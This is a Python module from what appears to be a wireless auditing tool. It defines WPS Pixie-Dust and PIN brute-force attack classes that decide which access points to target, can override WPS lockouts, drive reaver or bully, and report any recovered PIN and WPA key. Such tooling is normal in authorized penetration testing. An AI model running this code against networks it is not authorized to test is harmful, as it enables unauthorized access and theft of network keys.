"""WPS Pixie-Dust and PIN attacks."""

from __future__ import annotations

import time
from datetime import datetime, timezone

from ..models import CrackResult, EncryptionType, WPSState
from ..tools.reaver import WPSAttack
from .base import Attack, AttackResult


def _wps_base_ok(cfg, ap) -> bool:
    if not cfg.attack.wps:
        return False
    if ap.encryption == EncryptionType.WPA3:
        return False
    if ap.wps not in (WPSState.UNLOCKED, WPSState.LOCKED):
        return False
    if ap.is_enterprise:
        return False
    return True


class WPSPixieAttack(Attack):
    name = "wps-pixie"

    def can_attack(self) -> bool:
        if self.cfg.attack.wps_no_pixie:
            return False
        if not _wps_base_ok(self.cfg, self.ap):
            return False
        return self.ap.wps == WPSState.UNLOCKED

    def run(self) -> AttackResult:
        return self._run_wps(pixie=True)

    def _run_wps(self, *, pixie: bool) -> AttackResult:
        self.tracker.clear_skip()
        started = time.time()
        timeout = self.cfg.attack.wps_timeout
        tag = "wps-pixie" if pixie else "wps-pin"
        tool = "bully" if self.cfg.attack.use_bully else "reaver"
        mode = "Pixie-Dust" if pixie else "PIN"

        def on_line(line: str):
            short = line.strip()[:70]
            heartbeat = short.startswith("[heartbeat]")
            if short and not heartbeat:
                self.tracker.log(short, tag=tag)
            self.status(
                "attack",
                short if not heartbeat else short.removeprefix("[heartbeat] ").strip(),
                timeout=timeout,
                started=started,
            )

        self.status("attack", f"Starting {tool} {mode}...", timeout=timeout, started=started)
        self.tracker.log(f"{mode} attack on {self.ap.display_name}", tag=tag)

        runner = WPSAttack.run_pixie if pixie else WPSAttack.run_pin
        pin, key = runner(
            self.cfg, self.ap, timeout, on_line=on_line, should_stop=self.should_stop,
        )
        if self.should_stop():
            return self.skipped_result()
        if key:
            crack = CrackResult(
                bssid=self.ap.bssid, essid=self.ap.display_name, key=key,
                method=tag, capture_file="",
                cracked_at=datetime.now(timezone.utc).isoformat(),
            )
            self.status("cracked", f"Key found: {key}", started=started)
            return AttackResult(True, crack=crack, message=f"WPS {mode} cracked: {key}")
        if pin:
            self.status("partial", f"PIN={pin}, key not recovered", started=started)
            return AttackResult(False, message=f"WPS PIN found ({pin}) but key not recovered")
        self.status("failed", f"WPS {mode} failed", started=started)
        return AttackResult(False, message=f"WPS {mode} attack failed")


class WPSPinAttack(WPSPixieAttack):
    name = "wps-pin"

    def can_attack(self) -> bool:
        if self.cfg.attack.wps_pixie_only:
            return False
        if not self.cfg.attack.wps_pin:
            return False
        if not _wps_base_ok(self.cfg, self.ap):
            return False
        if self.ap.wps == WPSState.LOCKED and not self.cfg.attack.wps_ignore_locks:
            return False
        return True

    def run(self) -> AttackResult:
        return self._run_wps(pixie=False)